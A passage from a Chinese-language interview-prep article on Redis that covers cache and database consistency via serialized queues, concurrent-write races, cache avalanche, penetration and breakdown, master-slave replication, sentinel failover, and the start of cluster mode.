内部队列中。</p><p>一个队列对应一个工作线程，每个工作线程<strong>串行</strong>拿到对应的操作，然后一条一条的执行。这样的话，一个数据变更的操作，先删除缓存，然后再去更新数据库，但是还没完成更新。此时如果一个读请求过来，没有读到缓存，那么可以先将缓存更新的请求发送到队列中，此时会在队列中积压，然后同步等待缓存更新完成。</p><p>这里有一个<strong>优化点</strong>，一个队列中，其实<strong>多个更新缓存请求串在一起是没意义的</strong>，因此可以做过滤，如果发现队列中已经有一个更新缓存的请求了，那么就不用再放个更新请求操作进去了，直接等待前面的更新操作请求完成即可。</p><p>待那个队列对应的工作线程完成了上一个操作的数据库的修改之后，才会去执行下一个操作，也就是缓存更新的操作，此时会从数据库中读取最新的值，然后写入缓存中。</p><p>如果请求还在等待时间范围内，不断轮询发现可以取到值了，那么就直接返回；如果请求等待的时间超过一定时长，那么这一次直接从数据库中读取当前的旧值。</p><p>高并发的场景下，该解决方案要注意的问题：</p><ul><li>读请求长时阻塞</li></ul><p>由于读请求进行了非常轻度的异步化，所以一定要注意读超时的问题，每个读请求必须在超时时间范围内返回。</p><p>该解决方案，最大的风险点在于说，<strong>可能数据更新很频繁</strong>，导致队列中积压了大量更新操作在里面，然后<strong>读请求会发生大量的超时</strong>，最后导致大量的请求直接走数据库。务必通过一些模拟真实的测试，看看更新数据的频率是怎样的。</p><p>另外一点，因为一个队列中，可能会积压针对多个数据项的更新操作，因此需要根据自己的业务情况进行测试，可能需要<strong>部署多个服务</strong>，每个服务分摊一些数据的更新操作。如果一个内存队列里居然会挤压 100 个商品的库存修改操作，每个库存修改操作要耗费 10ms 去完成，那么最后一个商品的读请求，可能等待 10 * 100 = 1000ms = 1s 后，才能得到数据，这个时候就导致<strong>读请求的长时阻塞</strong>。</p><p>一定要做根据实际业务系统的运行情况，去进行一些压力测试，和模拟线上环境，去看看最繁忙的时候，内存队列可能会挤压多少更新操作，可能会导致最后一个更新操作对应的读请求，会 hang 多少时间，如果读请求在 200ms 返回，如果你计算过后，哪怕是最繁忙的时候，积压 10 个更新操作，最多等待 200ms，那还可以的。</p><p><strong>如果一个内存队列中可能积压的更新操作特别多</strong>，那么你就要<strong>加机器</strong>，让每个机器上部署的服务实例处理更少的数据，那么每个内存队列中积压的更新操作就会越少。</p><p>其实根据之前的项目经验，一般来说，数据的写频率是很低的，因此实际上正常来说，在队列中积压的更新操作应该是很少的。像这种针对读高并发、读缓存架构的项目，一般来说写请求是非常少的，每秒的 QPS 能到几百就不错了。</p><p>我们来<strong>实际粗略测算一下</strong>。</p><p>如果一秒有 500 的写操作，如果分成 5 个时间片，每 200ms 就 100 个写操作，放到 20 个内存队列中，每个内存队列，可能就积压 5 个写操作。每个写操作性能测试后，一般是在 20ms 左右就完成，那么针对每个内存队列的数据的读请求，也就最多 hang 一会儿，200ms 以内肯定能返回了。</p><p>经过刚才简单的测算，我们知道，单机支撑的写 QPS 在几百是没问题的，如果写 QPS 扩大了 10 倍，那么就扩容机器，扩容 10 倍的机器，每个机器 20 个队列。</p><ul><li>读请求并发量过高</li></ul><p>这里还必须做好压力测试，确保恰巧碰上上述情况的时候，还有一个风险，就是突然间大量读请求会在几十毫秒的延时 hang 在服务上，看服务能不能扛的住，需要多少机器才能扛住最大的极限情况的峰值。</p><p>但是因为并不是所有的数据都在同一时间更新，缓存也不会同一时间失效，所以每次可能也就是少数数据的缓存失效了，然后那些数据对应的读请求过来，并发量应该也不会特别大。</p><ul><li>多服务实例部署的请求路由</li></ul><p>可能这个服务部署了多个实例，那么必须<strong>保证</strong>说，执行数据更新操作，以及执行缓存更新操作的请求，都通过 Nginx 服务器<strong>路由到相同的服务实例上</strong>。</p><p>比如说，对同一个商品的读写请求，全部路由到同一台机器上。可以自己去做服务间的按照某个请求参数的 hash 路由，也可以用 Nginx 的 hash 路由功能等等。</p><ul><li>热点商品的路由问题，导致请求的倾斜</li></ul><p>万一某个商品的读写请求特别高，全部打到相同的机器的相同的队列里面去了，可能会造成某台机器的压力过大。就是说，因为只有在商品数据更新的时候才会清空缓存，然后才会导致读写并发，所以其实要根据业务系统去看，如果更新频率不是太高的话，这个问题的影响并不是特别大，但是的确可能某些机器的负载会高一些。</p><h1><span id="redis-的并发竞争问题是什么如何解决这个问题了解-redis-事务的-cas-方案吗">redis 的并发竞争问题是什么？如何解决这个问题？了解 redis 事务的 CAS 方案吗？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>这个也是线上非常常见的一个问题，就是<strong>多客户端同时并发写</strong>一个 key，可能本来应该先到的数据后到了，导致数据版本错了；或者是多客户端同时获取一个 key，修改值之后再写回去，只要顺序错了，数据就错了。</p><p>而且 redis 自己就有天然解决这个问题的 CAS 类的乐观锁方案。</p><h2><span id="面试题剖析">面试题剖析</span></h2><p>某个时刻，多个系统实例都去更新某个 key。可以基于 zookeeper 实现分布式锁。每个系统通过 zookeeper 获取分布式锁，确保同一时间，只能有一个系统实例在操作某个 key，别人都不允许读和写。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/zookeeper-distributed-lock.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/zookeeper-distributed-lock.png" alt="zookeeper-distributed-lock"></a></p><p>你要写入缓存的数据，都是从 mysql 里查出来的，都得写入 mysql 中，写入 mysql 中的时候必须保存一个时间戳，从 mysql 查出来的时候，时间戳也查出来。</p><p>每次要<strong>写之前，先判断</strong>一下当前这个 value 的时间戳是否比缓存里的 value 的时间戳要新。如果是的话，那么可以写，否则，就不能用旧的数据覆盖新的数据。</p><h1><span id="了解什么是-redis-的雪崩-穿透和击穿redis-崩溃之后会怎么样系统该如何应对这种情况如何处理-redis-的穿透">了解什么是 redis 的雪崩、穿透和击穿？redis 崩溃之后会怎么样？系统该如何应对这种情况？如何处理 redis 的穿透？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>其实这是问到缓存必问的，因为缓存雪崩和穿透，是缓存最大的两个问题，要么不出现，一旦出现就是致命性的问题，所以面试官一定会问你。</p><h2><span id="面试题剖析">面试题剖析</span></h2><h3><span id="缓存雪崩">缓存雪崩</span></h3><p>对于系统 A，假设每天高峰期每秒 5000 个请求，本来缓存在高峰期可以扛住每秒 4000 个请求，但是缓存机器意外发生了全盘宕机。缓存挂了，此时 1 秒 5000 个请求全部落数据库，数据库必然扛不住，它会报一下警，然后就挂了。此时，如果没有采用什么特别的方案来处理这个故障，DBA 很着急，重启数据库，但是数据库立马又被新的流量给打死了。</p><p>这就是缓存雪崩。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-caching-avalanche.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-caching-avalanche.png" alt="redis-caching-avalanche"></a></p><p>大约在 3 年前，国内比较知名的一个互联网公司，曾因为缓存事故，导致雪崩，后台系统全部崩溃，事故从当天下午持续到晚上凌晨 3~4 点，公司损失了几千万。</p><p>缓存雪崩的事前事中事后的解决方案如下：</p><ul><li>事前：redis 高可用，主从+哨兵，redis cluster，避免全盘崩溃。</li><li>事中：本地 ehcache 缓存 + hystrix 限流&amp;降级，避免 MySQL 被打死。</li><li>事后：redis 持久化，一旦重启，自动从磁盘上加载数据，快速恢复缓存数据。</li></ul><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-caching-avalanche-solution.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-caching-avalanche-solution.png" alt="redis-caching-avalanche-solution"></a></p><p>用户发送一个请求，系统 A 收到请求后，先查本地 ehcache 缓存，如果没查到再查 redis。如果 ehcache 和 redis 都没有，再查数据库，将数据库中的结果，写入 ehcache 和 redis 中。</p><p>限流组件，可以设置每秒的请求，有多少能通过组件，剩余的未通过的请求，怎么办？<strong>走降级</strong>！可以返回一些默认的值，或者友情提示，或者空白的值。</p><p>好处：</p><ul><li>数据库绝对不会死，限流组件确保了每秒只有多少个请求能通过。</li><li>只要数据库不死，就是说，对用户来说，2/5 的请求都是可以被处理的。</li><li>只要有 2/5 的请求可以被处理，就意味着你的系统没死，对用户来说，可能就是点击几次刷不出来页面，但是多点几次，就可以刷出来一次。</li></ul><h3><span id="缓存穿透">缓存穿透</span></h3><p>对于系统A，假设一秒 5000 个请求，结果其中 4000 个请求是黑客发出的恶意攻击。</p><p>黑客发出的那 4000 个攻击，缓存中查不到，每次你去数据库里查，也查不到。</p><p>举个栗子。数据库 id 是从 1 开始的，结果黑客发过来的请求 id 全部都是负数。这样的话，缓存中不会有，请求每次都“<strong>视缓存于无物</strong>”，直接查询数据库。这种恶意攻击场景的缓存穿透就会直接把数据库给打死。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-caching-penetration.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-caching-penetration.png" alt="redis-caching-penetration"></a></p><p>解决方式很简单，每次系统 A 从数据库中只要没查到，就写一个空值到缓存里去，比如 <code>set -999 UNKNOWN</code>。然后设置一个过期时间，这样的话，下次有相同的 key 来访问的时候，在缓存失效之前，都可以直接从缓存中取数据。</p><h3><span id="缓存击穿">缓存击穿</span></h3><p>缓存击穿，就是说某个 key 非常热点，访问非常频繁，处于集中式高并发访问的情况，当这个 key 在失效的瞬间，大量的请求就击穿了缓存，直接请求数据库，就像是在一道屏障上凿开了一个洞。</p><p>不同场景下的解决方式可如下：</p><ul><li>若缓存的数据是基本不会发生更新的，则可尝试将该热点数据设置为永不过期。</li><li>若缓存的数据更新不频繁，且缓存刷新的整个流程耗时较少的情况下，则可以采用基于 redis、zookeeper 等分布式中间件的分布式互斥锁，或者本地互斥锁以保证仅少量的请求能请求数据库并重新构建缓存，其余线程则在锁释放后能访问到新缓存。</li><li>若缓存的数据更新频繁或者缓存刷新的流程耗时较长的情况下，可以利用定时线程在缓存过期前主动的重新构建缓存或者延后缓存的过期时间，以保证所有的请求能一直访问到对应的缓存。</li></ul><h1><span id="redis-主从架构">Redis 主从架构</span></h1><p>单机的 redis，能够承载的 QPS 大概就在上万到几万不等。对于缓存来说，一般都是用来支撑<strong>读高并发</strong>的。因此架构做成主从(master-slave)架构，一主多从，主负责写，并且将数据复制到其它的 slave 节点，从节点负责读。所有的<strong>读请求全部走从节点</strong>。这样也可以很轻松实现水平扩容，<strong>支撑读高并发</strong>。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-master-slave.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-master-slave.png" alt="redis-master-slave"></a></p><p>redis replication -&gt; 主从架构 -&gt; 读写分离 -&gt; 水平扩容支撑读高并发</p><h2><span id="redis-replication-的核心机制">redis replication 的核心机制</span></h2><ul><li>redis 采用<strong>异步方式</strong>复制数据到 slave 节点，不过 redis2.8 开始，slave node 会周期性地确认自己每次复制的数据量；</li><li>一个 master node 是可以配置多个 slave node 的；</li><li>slave node 也可以连接其他的 slave node；</li><li>slave node 做复制的时候，不会 block master node 的正常工作；</li><li>slave node 在做复制的时候，也不会 block 对自己的查询操作，它会用旧的数据集来提供服务；但是复制完成的时候，需要删除旧数据集，加载新数据集，这个时候就会暂停对外服务了；</li><li>slave node 主要用来进行横向扩容，做读写分离，扩容的 slave node 可以提高读的吞吐量。</li></ul><p>注意，如果采用了主从架构，那么建议必须<strong>开启</strong> master node 的<a href="https://github.com/Disda-coding/advanced-java/blob/master/docs/high-concurrency/redis-persistence.md" target="_blank" rel="noopener">持久化</a>，不建议用 slave node 作为 master node 的数据热备，因为那样的话，如果你关掉 master 的持久化，可能在 master 宕机重启的时候数据是空的，然后可能一经过复制， slave node 的数据也丢了。</p><p>另外，master 的各种备份方案，也需要做。万一本地的所有文件丢失了，从备份中挑选一份 rdb 去恢复 master，这样才能<strong>确保启动的时候，是有数据的</strong>，即使采用了后续讲解的<a href="https://github.com/Disda-coding/advanced-java/blob/master/docs/high-concurrency/redis-sentinel.md" target="_blank" rel="noopener">高可用机制</a>，slave node 可以自动接管 master node，但也可能 sentinel 还没检测到 master failure，master node 就自动重启了，还是可能导致上面所有的 slave node 数据被清空。</p><h2><span id="redis-主从复制的核心原理">redis 主从复制的核心原理</span></h2><p>当启动一个 slave node 的时候，它会发送一个 <code>PSYNC</code> 命令给 master node。</p><p>如果这是 slave node 初次连接到 master node，那么会触发一次 <code>full resynchronization</code> 全量复制。此时 master 会启动一个后台线程，开始生成一份 <code>RDB</code> 快照文件，同时还会将从客户端 client 新收到的所有写命令缓存在内存中。<code>RDB</code> 文件生成完毕后， master 会将这个 <code>RDB</code> 发送给 slave，slave 会先<strong>写入本地磁盘，然后再从本地磁盘加载到内存</strong>中，接着 master 会将内存中缓存的写命令发送到 slave，slave 也会同步这些数据。slave node 如果跟 master node 有网络故障，断开了连接，会自动重连，连接之后 master node 仅会复制给 slave 部分缺少的数据。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-master-slave-replication.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-master-slave-replication.png" alt="redis-master-slave-replication"></a></p><h3><span id="主从复制的断点续传">主从复制的断点续传</span></h3><p>从 redis2.8 开始，就支持主从复制的断点续传，如果主从复制过程中，网络连接断掉了，那么可以接着上次复制的地方，继续复制下去，而不是从头开始复制一份。</p><p>master node 会在内存中维护一个 backlog，master 和 slave 都会保存一个 replica offset 还有一个 master run id，offset 就是保存在 backlog 中的。如果 master 和 slave 网络连接断掉了，slave 会让 master 从上次 replica offset 开始继续复制，如果没有找到对应的 offset，那么就会执行一次 <code>resynchronization</code>。</p><blockquote><p>如果根据 host+ip 定位 master node，是不靠谱的，如果 master node 重启或者数据出现了变化，那么 slave node 应该根据不同的 run id 区分。</p></blockquote><h3><span id="无磁盘化复制">无磁盘化复制</span></h3><p>master 在内存中直接创建 <code>RDB</code>，然后发送给 slave，不会在自己本地落地磁盘了。只需要在配置文件中开启 <code>repl-diskless-sync yes</code> 即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">repl-diskless-sync yes</span><br><span class="line"></span><br><span class="line"># 等待 5s 后再开始复制，因为要等更多 slave 重新连接过来</span><br><span class="line">repl-diskless-sync-delay 5</span><br></pre></td></tr></table></figure><h3><span id="过期-key-处理">过期 key 处理</span></h3><p>slave 不会过期 key，只会等待 master 过期 key。如果 master 过期了一个 key，或者通过 LRU 淘汰了一个 key，那么会模拟一条 del 命令发送给 slave。</p><h2><span id="复制的完整流程">复制的完整流程</span></h2><p>slave node 启动时，会在自己本地保存 master node 的信息，包括 master node 的<code>host</code>和<code>ip</code>，但是复制流程没开始。</p><p>slave node 内部有个定时任务，每秒检查是否有新的 master node 要连接和复制，如果发现，就跟 master node 建立 socket 网络连接。然后 slave node 发送 <code>ping</code> 命令给 master node。如果 master 设置了 requirepass，那么 slave node 必须发送 masterauth 的口令过去进行认证。master node <strong>第一次执行全量复制</strong>，将所有数据发给 slave node。而在后续，master node 持续将写命令，异步复制给 slave node。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-master-slave-replication-detail.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-master-slave-replication-detail.png" alt="redis-master-slave-replication-detail"></a></p><h3><span id="全量复制">全量复制</span></h3><ul><li>master 执行 bgsave ，在本地生成一份 rdb 快照文件。</li><li>master node 将 rdb 快照文件发送给 slave node，如果 rdb 复制时间超过 60秒（repl-timeout），那么 slave node 就会认为复制失败，可以适当调大这个参数(对于千兆网卡的机器，一般每秒传输 100MB，6G 文件，很可能超过 60s)</li><li>master node 在生成 rdb 时，会将所有新的写命令缓存在内存中，在 slave node 保存了 rdb 之后，再将新的写命令复制给 slave node。</li><li>如果在复制期间，内存缓冲区持续消耗超过 64MB，或者一次性超过 256MB，那么停止复制，复制失败。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client-output-buffer-limit slave 256MB 64MB 60</span><br></pre></td></tr></table></figure><ul><li>slave node 接收到 rdb 之后，清空自己的旧数据，然后重新加载 rdb 到自己的内存中，同时<strong>基于旧的数据版本</strong>对外提供服务。</li><li>如果 slave node 开启了 AOF，那么会立即执行 BGREWRITEAOF，重写 AOF。</li></ul><h3><span id="增量复制">增量复制</span></h3><ul><li>如果全量复制过程中，master-slave 网络连接断掉，那么 slave 重新连接 master 时，会触发增量复制。</li><li>master 直接从自己的 backlog 中获取部分丢失的数据，发送给 slave node，默认 backlog 就是 1MB。</li><li>master 就是根据 slave 发送的 psync 中的 offset 来从 backlog 中获取数据的。</li></ul><h3><span id="heartbeat">heartbeat</span></h3><p>主从节点互相都会发送 heartbeat 信息。</p><p>master 默认每隔 10秒 发送一次 heartbeat，slave node 每隔 1秒 发送一个 heartbeat。</p><h3><span id="异步复制">异步复制</span></h3><p>master 每次接收到写命令之后，先在内部写入数据，然后异步发送给 slave node。</p><h2><span id="redis-如何才能做到高可用">redis 如何才能做到高可用</span></h2><p>如果系统在 365 天内，有 99.99% 的时间，都是可以哗哗对外提供服务的，那么就说系统是高可用的。</p><p>一个 slave 挂掉了，是不会影响可用性的，还有其它的 slave 在提供相同数据下的相同的对外的查询服务。</p><p>但是，如果 master node 死掉了，会怎么样？没法写数据了，写缓存的时候，全部失效了。slave node 还有什么用呢，没有 master 给它们复制数据了，系统相当于不可用了。</p><p>redis 的高可用架构，叫做 <code>failover</code> <strong>故障转移</strong>，也可以叫做主备切换。</p><p>master node 在故障时，自动检测，并且将某个 slave node 自动切换为 master node 的过程，叫做主备切换。这个过程，实现了 redis 的主从架构下的高可用。</p><h1><span id="redis-哨兵集群实现高可用">Redis 哨兵集群实现高可用</span></h1><h2><span id="哨兵的介绍">哨兵的介绍</span></h2><p>sentinel，中文名是哨兵。哨兵是 redis 集群机构中非常重要的一个组件，主要有以下功能：</p><ul><li>集群监控：负责监控 redis master 和 slave 进程是否正常工作。</li><li>消息通知：如果某个 redis 实例有故障，那么哨兵负责发送消息作为报警通知给管理员。</li><li>故障转移：如果 master node 挂掉了，会自动转移到 slave node 上。</li><li>配置中心：如果故障转移发生了，通知 client 客户端新的 master 地址。</li></ul><p>哨兵用于实现 redis 集群的高可用，本身也是分布式的，作为一个哨兵集群去运行，互相协同工作。</p><ul><li>故障转移时，判断一个 master node 是否宕机了，需要大部分的哨兵都同意才行，涉及到了分布式选举的问题。</li><li>即使部分哨兵节点挂掉了，哨兵集群还是能正常工作的，因为如果一个作为高可用机制重要组成部分的故障转移系统本身是单点的，那就很坑爹了。</li></ul><h2><span id="哨兵的核心知识">哨兵的核心知识</span></h2><ul><li>哨兵至少需要 3 个实例，来保证自己的健壮性。</li><li>哨兵 + redis 主从的部署架构，是<strong>不保证数据零丢失</strong>的，只能保证 redis 集群的高可用性。</li><li>对于哨兵 + redis 主从这种复杂的部署架构，尽量在测试环境和生产环境，都进行充足的测试和演练。</li></ul><p>哨兵集群必须部署 2 个以上节点，如果哨兵集群仅仅部署了 2 个哨兵实例，quorum = 1。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+----+         +----+</span><br><span class="line">| M1 |---------| R1 |</span><br><span class="line">| S1 |         | S2 |</span><br><span class="line">+----+         +----+</span><br></pre></td></tr></table></figure><p>配置 <code>quorum=1</code>，如果 master 宕机， s1 和 s2 中只要有 1 个哨兵认为 master 宕机了，就可以进行切换，同时 s1 和 s2 会选举出一个哨兵来执行故障转移。但是同时这个时候，需要 majority，也就是大多数哨兵都是运行的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2 个哨兵，majority&#x3D;2</span><br><span class="line">3 个哨兵，majority&#x3D;2</span><br><span class="line">4 个哨兵，majority&#x3D;2</span><br><span class="line">5 个哨兵，majority&#x3D;3</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果此时仅仅是 M1 进程宕机了，哨兵 s1 正常运行，那么故障转移是 OK 的。但是如果是整个 M1 和 S1 运行的机器宕机了，那么哨兵只有 1 个，此时就没有 majority 来允许执行故障转移，虽然另外一台机器上还有一个 R1，但是故障转移不会执行。</p><p>经典的 3 节点哨兵集群是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">       +----+</span><br><span class="line">       | M1 |</span><br><span class="line">       | S1 |</span><br><span class="line">       +----+</span><br><span class="line">          |</span><br><span class="line">+----+    |    +----+</span><br><span class="line">| R2 |----+----| R3 |</span><br><span class="line">| S2 |         | S3 |</span><br><span class="line">+----+         +----+</span><br></pre></td></tr></table></figure><p>配置 <code>quorum=2</code>，如果 M1 所在机器宕机了，那么三个哨兵还剩下 2 个，S2 和 S3 可以一致认为 master 宕机了，然后选举出一个来执行故障转移，同时 3 个哨兵的 majority 是 2，所以还剩下的 2 个哨兵运行着，就可以允许执行故障转移。</p><h2><span id="redis-哨兵主备切换的数据丢失问题">redis 哨兵主备切换的数据丢失问题</span></h2><h3><span id="两种情况和导致数据丢失">两种情况和导致数据丢失</span></h3><p>主备切换的过程，可能会导致数据丢失：</p><ul><li>异步复制导致的数据丢失</li></ul><p>因为 master-&gt;slave 的复制是异步的，所以可能有部分数据还没复制到 slave，master 就宕机了，此时这部分数据就丢失了。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/async-replication-data-lose-case.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/async-replication-data-lose-case.png" alt="async-replication-data-lose-case"></a></p><ul><li>脑裂导致的数据丢失</li></ul><p>脑裂，也就是说，某个 master 所在机器突然<strong>脱离了正常的网络</strong>，跟其他 slave 机器不能连接，但是实际上 master 还运行着。此时哨兵可能就会<strong>认为</strong> master 宕机了，然后开启选举，将其他 slave 切换成了 master。这个时候，集群里就会有两个 master ，也就是所谓的<strong>脑裂</strong>。</p><p>此时虽然某个 slave 被切换成了 master，但是可能 client 还没来得及切换到新的 master，还继续向旧 master 写数据。因此旧 master 再次恢复的时候，会被作为一个 slave 挂到新的 master 上去，自己的数据会清空，重新从新的 master 复制数据。而新的 master 并没有后来 client 写入的数据，因此，这部分数据也就丢失了。</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-cluster-split-brain.png" target="_blank" rel="noopener"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-cluster-split-brain.png" alt="redis-cluster-split-brain"></a></p><h3><span id="数据丢失问题的解决方案">数据丢失问题的解决方案</span></h3><p>进行如下配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min-slaves-to-write 1</span><br><span class="line">min-slaves-max-lag 10</span><br></pre></td></tr></table></figure><p>表示，要求至少有 1 个 slave，数据复制和同步的延迟不能超过 10 秒。</p><p>如果说一旦所有的 slave，数据复制和同步的延迟都超过了 10 秒钟，那么这个时候，master 就不会再接收任何请求了。</p><ul><li>减少异步复制数据的丢失</li></ul><p>有了 <code>min-slaves-max-lag</code> 这个配置，就可以确保说，一旦 slave 复制数据和 ack 延时太长，就认为可能 master 宕机后损失的数据太多了，那么就拒绝写请求，这样可以把 master 宕机时由于部分数据未同步到 slave 导致的数据丢失降低的可控范围内。</p><ul><li>减少脑裂的数据丢失</li></ul><p>如果一个 master 出现了脑裂，跟其他 slave 丢了连接，那么上面两个配置可以确保说，如果不能继续给指定数量的 slave 发送数据，而且 slave 超过 10 秒没有给自己 ack 消息，那么就直接拒绝客户端的写请求。因此在脑裂场景下，最多就丢失 10 秒的数据。</p><h2><span id="sdown-和-odown-转换机制">sdown 和 odown 转换机制</span></h2><ul><li>sdown 是主观宕机，就一个哨兵如果自己觉得一个 master 宕机了，那么就是主观宕机</li><li>odown 是客观宕机，如果 quorum 数量的哨兵都觉得一个 master 宕机了，那么就是客观宕机</li></ul><p>sdown 达成的条件很简单，如果一个哨兵 ping 一个 master，超过了 <code>is-master-down-after-milliseconds</code> 指定的毫秒数之后，就主观认为 master 宕机了；如果一个哨兵在指定时间内，收到了 quorum 数量的其它哨兵也认为那个 master 是 sdown 的，那么就认为是 odown 了。</p><h2><span id="哨兵集群的自动发现机制">哨兵集群的自动发现机制</span></h2><p>哨兵互相之间的发现，是通过 redis 的 <code>pub/sub</code> 系统实现的，每个哨兵都会往 <code>__sentinel__:hello</code> 这个 channel 里发送一个消息，这时候所有其他哨兵都可以消费到这个消息，并感知到其他的哨兵的存在。</p><p>每隔两秒钟，每个哨兵都会往自己监控的某个 master+slaves 对应的 <code>__sentinel__:hello</code> channel 里<strong>发送一个消息</strong>，内容是自己的 host、ip 和 runid 还有对这个 master 的监控配置。</p><p>每个哨兵也会去<strong>监听</strong>自己监控的每个 master+slaves 对应的 <code>__sentinel__:hello</code> channel，然后去感知到同样在监听这个 master+slaves 的其他哨兵的存在。</p><p>每个哨兵还会跟其他哨兵交换对 <code>master</code> 的监控配置，互相进行监控配置的同步。</p><h2><span id="slave-配置的自动纠正">slave 配置的自动纠正</span></h2><p>哨兵会负责自动纠正 slave 的一些配置，比如 slave 如果要成为潜在的 master 候选人，哨兵会确保 slave 复制现有 master 的数据；如果 slave 连接到了一个错误的 master 上，比如故障转移之后，那么哨兵会确保它们连接到正确的 master 上。</p><h2><span id="slave-gtmaster-选举算法">slave-&gt;master 选举算法</span></h2><p>如果一个 master 被认为 odown 了，而且 majority 数量的哨兵都允许主备切换，那么某个哨兵就会执行主备切换操作，此时首先要选举一个 slave 来，会考虑 slave 的一些信息：</p><ul><li>跟 master 断开连接的时长</li><li>slave 优先级</li><li>复制 offset</li><li>run id</li></ul><p>如果一个 slave 跟 master 断开连接的时间已经超过了 <code>down-after-milliseconds</code> 的 10 倍，外加 master 宕机的时长，那么 slave 就被认为不适合选举为 master。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(down-after-milliseconds * 10) + milliseconds_since_master_is_in_SDOWN_state</span><br></pre></td></tr></table></figure><p>接下来会对 slave 进行排序：</p><ul><li>按照 slave 优先级进行排序，slave priority 越低，优先级就越高。</li><li>如果 slave priority 相同，那么看 replica offset，哪个 slave 复制了越多的数据，offset 越靠后，优先级就越高。</li><li>如果上面两个条件都相同，那么选择一个 run id 比较小的那个 slave。</li></ul><h2><span id="quorum-和-majority">quorum 和 majority</span></h2><p>每次一个哨兵要做主备切换，首先需要 quorum 数量的哨兵认为 odown，然后选举出一个哨兵来做切换，这个哨兵还需要得到 majority 哨兵的授权，才能正式执行切换。</p><p>如果 quorum &lt; majority，比如 5 个哨兵，majority 就是 3，quorum 设置为 2，那么就 3 个哨兵授权就可以执行切换。</p><p>但是如果 quorum &gt;= majority，那么必须 quorum 数量的哨兵都授权，比如 5 个哨兵，quorum 是 5，那么必须 5 个哨兵都同意授权，才能执行切换。</p><h2><span id="configuration-epoch">configuration epoch</span></h2><p>哨兵会对一套 redis master+slaves 进行监控，有相应的监控的配置。</p><p>执行切换的那个哨兵，会从要切换到的新 master（salve-&gt;master）那里得到一个 configuration epoch，这就是一个 version 号，每次切换的 version 号都必须是唯一的。</p><p>如果第一个选举出的哨兵切换失败了，那么其他哨兵，会等待 failover-timeout 时间，然后接替继续执行切换，此时会重新获取一个新的 configuration epoch，作为新的 version 号。</p><h2><span id="configuration-传播">configuration 传播</span></h2><p>哨兵完成切换之后，会在自己本地更新生成最新的 master 配置，然后同步给其他的哨兵，就是通过之前说的 <code>pub/sub</code> 消息机制。</p><p>这里之前的 version 号就很重要了，因为各种消息都是通过一个 channel 去发布和监听的，所以一个哨兵完成一次新的切换之后，新的 master 配置是跟着新的 version 号的。其他的哨兵都是根据版本号的大小来更新自己的 master 配置的。</p><h1><span id="redis-集群模式的工作原理能说一下么在集群模式下redis-的-key-是如何寻址的分布式寻址都有哪些算法了解一致性-hash-算法吗">redis 集群模式的工作原理能说一下么？在集群模式下，redis 的 key 是如何寻址的？分布式寻址都有哪些算法？了解一致性 hash 算法吗？</span></h1><h2><span id="面试官心理分析">面试官心理分析</span></h2><p>在前几年，redis 如果要搞几个节点，每个节点存储一部分的数据，得<strong>借助一些中间件</strong>来实现，比如说有 <code>codis</code>，或者 <code>twemproxy</code>，都有。有一些 redis 中间件，你读写 redis 中间件，redis 中间件负责将你的数据分布式存储在多台机器上的 redis 实例中。</p><p>这两年，redis 不断在发展，redis 也不断有新的版本，现在的 redis 集群模式，可以做到在多台机器上，部署多个 redis 实例，每个实例存储一部分的数据，同时每个 redis 主实例可以挂 redis 从实例，自动确保说，如果 redis 主实例挂了，会自动切换到 redis 从实例上来。</p><p>现在 redis 的新版本，大家都是用 redis cluster 的，也就是 redis 原生支持的 redis 集群模式，那么面试官肯定会就 redis cluster 对你来个几连炮。要是你没用过 redis cluster，正常，以前很多人用 codis 之类的客户端来支持集群，但是起码你得研究一下 redis cluster 吧。</p><p>如果你的数据量很少，主要是承载高并发高性能的场景，比如你的缓存一般就几个 G，单机就足够了，可以使用 replication，一个 master 多个 slaves，要几个 slave 跟你要求的读吞吐量有关，然后自己搭建一个 sentinel 集群去保证 redis 主从架构的高可用性。</p><p>redis 